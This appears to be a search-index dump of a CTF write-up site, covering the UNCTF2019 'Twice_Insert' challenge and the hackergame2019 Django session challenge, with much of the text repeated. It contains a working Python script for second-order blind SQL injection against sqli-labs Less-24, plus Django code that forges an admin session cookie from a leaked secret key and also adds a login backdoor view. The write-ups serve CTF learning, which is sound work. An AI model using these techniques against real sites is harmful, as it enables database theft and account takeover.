\u7f16\u5199EXP \u5199python\u811a\u672c\uff0c\u901a\u8fc7\u591a\u6b21\u6ce8\u518c\u7528\u6237\u3001\u4fee\u6539\u5bc6\u7801\uff0c\u8fdb\u884c\u66b4\u5e93\u3002 #coding = utf-8 import requests url = http://183.129.189.60:10003/sqli/Less-24/login_create.php url1 = http://183.129.189.60:10003/sqli/Less-24/login.php url2 = http://183.129.189.60:10003/sqli/Less-24/pass_change.php #\u5c06\u5bc6\u7801\u6539\u56de1 def change21 (): user = scl s = requests . session () data = { login_user : user , login_password : 0 , mysubmit : Login } r = s . post ( url1 , data ) data = { current_password : 0 , password : 1 , re_password : 1 , submit : Reset } r = s . post ( url2 , data ) def second (): flag = tmp = 1 for i in range ( 1 , 50 ): if tmp == 0 : break tmp = 0 for j in range ( 32 , 127 ): s = requests . session () user = scl and ascii(substr((select database()), + str ( i ) + ,1))= + str ( j ) + # print user # \u6ce8\u518c\u7528\u6237\u540d data = { username : user , password : 1 , re_password : 1 , submit : Register } r = s . post ( url , data ) # \u767b\u5f55\u7528\u6237 data = { login_user : user , login_password : 1 , mysubmit : Login } r = s . post ( url1 , data ) # print r.content.decode() if YOU ARE LOGGED IN AS in r . content . decode (): print login ok # \u66f4\u6539\u5bc6\u7801 data = { current_password : 1 , password : 0 , re_password : 0 , submit : Reset } r = s . post ( url2 , data ) if successfully updated in r . content . decode (): flag += chr ( j ) tmp = 1 print change ok change21 () break print flag second () \u603b\u7ed3 \u8fd9\u4e2a\u9898\u76ee\u7684\u7c7b\u578b\u662f\u7b2c\u4e00\u89c1\uff0c\u5728\u5317\u4eac\u8054\u5408\u5927\u5b66\u4e3e\u529e\u7684UNCTF\u91cc\u9762\u7b2c\u4e00\u6b21\u89c1\u5230\uff0c\u7136\u540e\u6628\u5929\u53bb\u6253web\u5b89\u5168\u7684\u7701\u8d5b\u53c8\u9047\u5230\u4e86\uff08\u5b89\u6052\u771f\u4f1a\u7701\u4e8b\uff09\uff0c\u5f53\u65f6\u62ff\u5230\u73af\u5883\u590d\u73b0\u4e86\u4e00\u4e0b\uff0c\u4f46\u662f\u7531\u4e8e\u670d\u52a1\u5668\u539f\u56e0\uff0c\u6ca1\u6709\u8dd1\u51fa\u5b8c\u6574\u7684flag\uff0c\u4f46\u662f\u662f\u7b2c\u4e00\u6b21\u89c1\u8fd9\u7c7b\u7684\u9898\uff0c\u5199\u4e2a\u9898\u89e3\u5b66\u4e60\u4e00\u4e0b\u3002","title":"UNCTF2019-Twice_Insert"},{"location":"web/SQLi/UNCTF2019-Twice_Insert/#unctf-twice_insert","text":"","title":"UNCTF-Twice_Insert"},{"location":"web/SQLi/UNCTF2019-Twice_Insert/#_1","text":"\u9898\u76ee\u63d0\u793atwice-insert\uff0c\u5206\u6790\u662f\u5229\u7528\u4e8c\u6b21\u6ce8\u5165\u83b7\u53d6admin\u5bc6\u7801\u6216\u8005\u662f\u66b4\u5e93\u62ffflag\u3002","title":"\u539f\u7406\u5206\u6790"},{"location":"web/SQLi/UNCTF2019-Twice_Insert/#_2","text":"1\uff09\u8bbf\u95ee\u76ee\u6807\u4e3b\u673a\uff0c\u6253\u5f00\u9875\u9762\u53d1\u73b0\u662f sqli-labs-24 \uff0c\u539f\u9898\u662f\u5229\u7528 \u4e8c\u6b21\u6ce8\u5165 \u4fee\u6539admin\u5bc6\u7801\uff0c\u8fd9\u9898\u4fee\u6539admin\u5bc6\u7801\u5374\u6ca1\u6709flag\uff0c\u8981\u60f3\u62ff\u5230flag\u53ef\u80fd\u9700\u8981\u7206\u5e93\u3002 2\uff09\u6839\u636e\u9898\u610f\uff0c\u5c1d\u8bd5\u5e03\u5c14\u76f2\u6ce8 * \u53d1\u73b0 or \u88ab\u8fc7\u6ee4\uff0c\u5982\u6b64\u9700\u8981\u6362\u4e00\u4e2a\u601d\u8def\uff0c\u56e0\u4e3a\u6709\u6ce8\u518c\u6309\u94ae\uff0c\u5c1d\u8bd5\u6ce8\u518c\u65b0\u7528\u6237\u3002 3)\u6ce8\u518c\u4e00\u4e2a\u65b0\u7528\u6237 scl \uff0cpassword\u4e3a 1 \uff0c\u7136\u540e\u6ce8\u518c\u7528\u6237 scl\u2019and 1# \uff08\u8be5\u7528\u6237\u540d\u7528\u4e8e\u6d4b\u8bd5\u6ce8\u5165\uff09\uff0cpassword\u4e3a 1 \uff0c\u7528\u4e8e\u540e\u9762\u7684\u6d4b\u8bd5 \u4fee\u6539\u7528\u6237 scl\u2019and 1# \u7684\u5bc6\u7801\u4e3a 0 \u4fee\u6539\u6210\u529f\uff1a 4)\u5c06scl\u7684\u5bc6\u7801\u91cd\u7f6e\u4e3a 1 \uff1a\u6ce8\u518c\u65b0\u7684\u7528\u6237 scl\u2019and 0# \uff0cpassword\u4e3a 1 \uff0c\u7136\u540e\u767b\u9646\u8be5\u8d26\u53f7\u4fee\u6539\u5bc6\u7801 \u56de\u663e\u5982\u4e0b\uff1a \u5bc6\u7801\u66f4\u65b0\u5931\u8d25\uff0c\u8bf4\u660e\u5b58\u5728\u5e03\u5c14\u76f2\u6ce8\u3002","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"web/SQLi/UNCTF2019-Twice_Insert/#exp","text":"\u5199python\u811a\u672c\uff0c\u901a\u8fc7\u591a\u6b21\u6ce8\u518c\u7528\u6237\u3001\u4fee\u6539\u5bc6\u7801\uff0c\u8fdb\u884c\u66b4\u5e93\u3002 #coding = utf-8 import requests url = http://183.129.189.60:10003/sqli/Less-24/login_create.php url1 = http://183.129.189.60:10003/sqli/Less-24/login.php url2 = http://183.129.189.60:10003/sqli/Less-24/pass_change.php #\u5c06\u5bc6\u7801\u6539\u56de1 def change21 (): user = scl s = requests . session () data = { login_user : user , login_password : 0 , mysubmit : Login } r = s . post ( url1 , data ) data = { current_password : 0 , password : 1 , re_password : 1 , submit : Reset } r = s . post ( url2 , data ) def second (): flag = tmp = 1 for i in range ( 1 , 50 ): if tmp == 0 : break tmp = 0 for j in range ( 32 , 127 ): s = requests . session () user = scl and ascii(substr((select database()), + str ( i ) + ,1))= + str ( j ) + # print user # \u6ce8\u518c\u7528\u6237\u540d data = { username : user , password : 1 , re_password : 1 , submit : Register } r = s . post ( url , data ) # \u767b\u5f55\u7528\u6237 data = { login_user : user , login_password : 1 , mysubmit : Login } r = s . post ( url1 , data ) # print r.content.decode() if YOU ARE LOGGED IN AS in r . content . decode (): print login ok # \u66f4\u6539\u5bc6\u7801 data = { current_password : 1 , password : 0 , re_password : 0 , submit : Reset } r = s . post ( url2 , data ) if successfully updated in r . content . decode (): flag += chr ( j ) tmp = 1 print change ok change21 () break print flag second ()","title":"\u7f16\u5199EXP"},{"location":"web/SQLi/UNCTF2019-Twice_Insert/#_3","text":"\u8fd9\u4e2a\u9898\u76ee\u7684\u7c7b\u578b\u662f\u7b2c\u4e00\u89c1\uff0c\u5728\u5317\u4eac\u8054\u5408\u5927\u5b66\u4e3e\u529e\u7684UNCTF\u91cc\u9762\u7b2c\u4e00\u6b21\u89c1\u5230\uff0c\u7136\u540e\u6628\u5929\u53bb\u6253web\u5b89\u5168\u7684\u7701\u8d5b\u53c8\u9047\u5230\u4e86\uff08\u5b89\u6052\u771f\u4f1a\u7701\u4e8b\uff09\uff0c\u5f53\u65f6\u62ff\u5230\u73af\u5883\u590d\u73b0\u4e86\u4e00\u4e0b\uff0c\u4f46\u662f\u7531\u4e8e\u670d\u52a1\u5668\u539f\u56e0\uff0c\u6ca1\u6709\u8dd1\u51fa\u5b8c\u6574\u7684flag\uff0c\u4f46\u662f\u662f\u7b2c\u4e00\u6b21\u89c1\u8fd9\u7c7b\u7684\u9898\uff0c\u5199\u4e2a\u9898\u89e3\u5b66\u4e60\u4e00\u4e0b\u3002","title":"\u603b\u7ed3"},{"location":"web/Session Bypass/hackergame2019-django/","text":"hackergame2019-\u88ab\u6cc4\u9732\u7684\u59dc\u6208(CallMeCro) \u300c\u542c\u8bf4\u6709\u79bb\u804c\u7684\u540c\u5b66\uff0c\u628a\u4f60\u4eec\u7684\u4ee3\u7801\u548c\u6570\u636e\u5e93\u6cc4\u6f0f\u4e86\u51fa\u53bb\uff1f\u597d\u50cf\u8fd8\u5728\u4ec0\u4e48 hub \u8fd8\u662f lab \u6765\u7740\u5efa\u4e86\u4e00\u4e2a\u53eb openlug\u2026\u2026\u300d \u300c\u6ca1\u5173\u7cfb\uff0c\u53cd\u6b63 admin \u7528\u6237\u7684\u5bc6\u7801\u957f\u5ea6\u6709 1024 \u4f4d\uff0c\u6211\u81ea\u5df1\u90fd\u5fd8\u4e86\u5bc6\u7801\uff0c\u5c31\u7b97\u8001\u5929\u7237\u6765\u4e86\uff0c\u4e5f\u770b\u4e0d\u5230\u6211\u4eec\u7684 flag\uff01\u300d Examination Site django session python code analysis Analysis Opening the web page will display a form that requires us to input an account and password.A hint is below the form \u4f60\u53ef\u4ee5\u4f7f\u7528 guest \u7528\u6237\uff08\u5bc6\u7801\u4e3a guest\uff09\u4f53\u9a8c\u3002 When you login as the guest,the web page will display your cookie and remind you that you can get the flag only by logging in as the admin. Debug - Your cookie sessionid = .eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iMsPb:Nx7ePDqCPji95TS21SJGVh3TBbk So we can see that we have to login as the admin to get the flag. With the question description,we will find the source code: https://github.com/openlug/django-common https://gitlab.com/openlug/django-common from django.core.management.base import BaseCommand from django.contrib.auth.models import User import os class Command ( BaseCommand ) : help = Create admin guest user def handle ( self, *args, **options ) : def create_user ( name, password = None ) : user = User.objects.create_user ( name, password = os.urandom ( 1024 ) if password is None else password ) user.is_superuser = False user.is_staff = False user.save () create_user ( admin ) create_user ( guest , guest ) After analyzing,we will see that it's unrealistic to login as the admin by cracking the password,only by foring the session.Let's exploit it! Expolit One Since you have source code,you can make a backdoor to be admin login to enter the profile.But it need some knowledge about django. Add it in the app/views.py: def backdoor ( request ) : user = User.objects.get ( username = admin ) # use Django ORM to choice admin login ( request, user ) # login as admin return redirect ( reverse ( profile )) # jump to profile Add it in the app/urls.py: path ( backdoor , views.backdoor, name = backdoor ) Run it,then we access the backdoor to get admin cookie which can be used to log in the server to get flag{Never_leak_your_sEcReT_KEY}. Exploit Two Analyzing the session code and forging it, this was my frist idea.However,I didn't understand the source code because I didn't understand function \"signing.loads\" and I gave up here (SUCCESS IS CLOSE AT HAND, AND IT IS A SHORTFALL) . As we have the guest cookie .eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iMsxr:yKCyLqXVih52879xB-FmomMjwsg we can use \"signing.loads\" to restore it. { _auth_user_hash : 0a884f8b987fca1a92c6f93d9042d83eea72d98d , _auth_user_id : 2 , _auth_user_backend : django.contrib.auth.backends.ModelBackend } It is easy to guess that admin auth_user_id is 1.Now we need to know the auth_user_hash. It is generated by get_session_auth_hash() in django/contrib/auth/base_user.py. def get_session_auth_hash ( self ) : Return an HMAC of the password field. key_salt = django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash return salted_hmac ( key_salt, self.password ) .hexdigest () Finally,the exp is this. from django.core import signing from django.utils.crypto import salted_hmac admin_hash = pbkdf2_sha256 $150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE = _auth_user_hash = salted_hmac ( django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash , admin_hash ) .hexdigest () payload = { _auth_user_id : 1 , _auth_user_backend : django.contrib.auth.backends.ModelBackend , _auth_user_hash : _auth_user_hash } cookie = signing.dumps ( payload, salt = django.contrib.sessions.backends.signed_cookies , compress = True ) print ( cookie ) Add this in the backdoor and access localhost/backdoor to get it.","title":"hackergame2019-django"},{"location":"web/Session Bypass/hackergame2019-django/#hackergame2019-callmecro","text":"\u300c\u542c\u8bf4\u6709\u79bb\u804c\u7684\u540c\u5b66\uff0c\u628a\u4f60\u4eec\u7684\u4ee3\u7801\u548c\u6570\u636e\u5e93\u6cc4\u6f0f\u4e86\u51fa\u53bb\uff1f\u597d\u50cf\u8fd8\u5728\u4ec0\u4e48 hub \u8fd8\u662f lab \u6765\u7740\u5efa\u4e86\u4e00\u4e2a\u53eb openlug\u2026\u2026\u300d \u300c\u6ca1\u5173\u7cfb\uff0c\u53cd\u6b63 admin \u7528\u6237\u7684\u5bc6\u7801\u957f\u5ea6\u6709 1024 \u4f4d\uff0c\u6211\u81ea\u5df1\u90fd\u5fd8\u4e86\u5bc6\u7801\uff0c\u5c31\u7b97\u8001\u5929\u7237\u6765\u4e86\uff0c\u4e5f\u770b\u4e0d\u5230\u6211\u4eec\u7684 flag\uff01\u300d","title":"hackergame2019-\u88ab\u6cc4\u9732\u7684\u59dc\u6208(CallMeCro)"},{"location":"web/Session Bypass/hackergame2019-django/#examination-site","text":"django session python code analysis","title":"Examination Site"},{"location":"web/Session Bypass/hackergame2019-django/#analysis","text":"Opening the web page will display a form that requires us to input an account and password.A hint is below the form \u4f60\u53ef\u4ee5\u4f7f\u7528 guest \u7528\u6237\uff08\u5bc6\u7801\u4e3a guest\uff09\u4f53\u9a8c\u3002 When you login as the guest,the web page will display your cookie and remind you that you can get the flag only by logging in as the admin. Debug - Your cookie sessionid = .eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iMsPb:Nx7ePDqCPji95TS21SJGVh3TBbk So we can see that we have to login as the admin to get the flag. With the question description,we will find the source code: https://github.com/openlug/django-common https://gitlab.com/openlug/django-common from django.core.management.base import BaseCommand from django.contrib.auth.models import User import os class Command ( BaseCommand ) : help = Create admin guest user def handle ( self, *args, **options ) : def create_user ( name, password = None ) : user = User.objects.create_user ( name, password = os.urandom ( 1024 ) if password is None else password ) user.is_superuser = False user.is_staff = False user.save () create_user ( admin ) create_user ( guest , guest ) After analyzing,we will see that it's unrealistic to login as the admin by cracking the password,only by foring the session.Let's exploit it!","title":"Analysis"},{"location":"web/Session Bypass/hackergame2019-django/#expolit-one","text":"Since you have source code,you can make a backdoor to be admin login to enter the profile.But it need some knowledge about django. Add it in the app/views.py: def backdoor ( request ) : user = User.objects.get ( username = admin ) # use Django ORM to choice admin login ( request, user ) # login as admin return redirect ( reverse ( profile )) # jump to profile Add it in the app/urls.py: path ( backdoor , views.backdoor, name = backdoor ) Run it,then we access the backdoor to get admin cookie which can be used to log in the server to get flag{Never_leak_your_sEcReT_KEY}.","title":"Expolit One"},{"location":"web/Session Bypass/hackergame2019-django/#exploit-two","text":"Analyzing the session code and forging it, this was my frist idea.However,I didn't understand the source code because I didn't understand function \"signing.loads\" and I gave up here (SUCCESS IS CLOSE AT HAND, AND IT IS A SHORTFALL) . As we have the guest cookie .eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iMsxr:yKCyLqXVih52879xB-FmomMjwsg we can use \"signing.loads\" to restore it. { _auth_user_hash : 0a884f8b987fca1a92c6f93d9042d83eea72d98d , _auth_user_id : 2 , _auth_user_backend : django.contrib.auth.backends.ModelBackend } It is easy to guess that admin auth_user_id is 1.Now we need to know the auth_user_hash. It is generated by get_session_auth_hash() in django/contrib/auth/base_user.py. def get_session_auth_hash ( self ) : Return an HMAC of the password field. key_salt = django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash return salted_hmac ( key_salt, self.password ) .hexdigest () Finally,the exp is this. from django.core import signing from django.utils.crypto import salted_hmac admin_hash = pbkdf2_sha256 $150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE = _auth_user_hash = salted_hmac ( django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash , admin_hash ) .hexdigest () payload = { _auth_user_id : 1 , _auth_user_backend : django.contrib.auth.backends.ModelBackend , _auth_user_hash : _auth_user_hash } cookie = signing.dumps ( payload, salt = django.contrib.sessions.backends.signed_cookies , compress = True ) print ( cookie ) Add this in the backdoor and access localhost/backdoor to get it.","title":"Exploit Two"}]}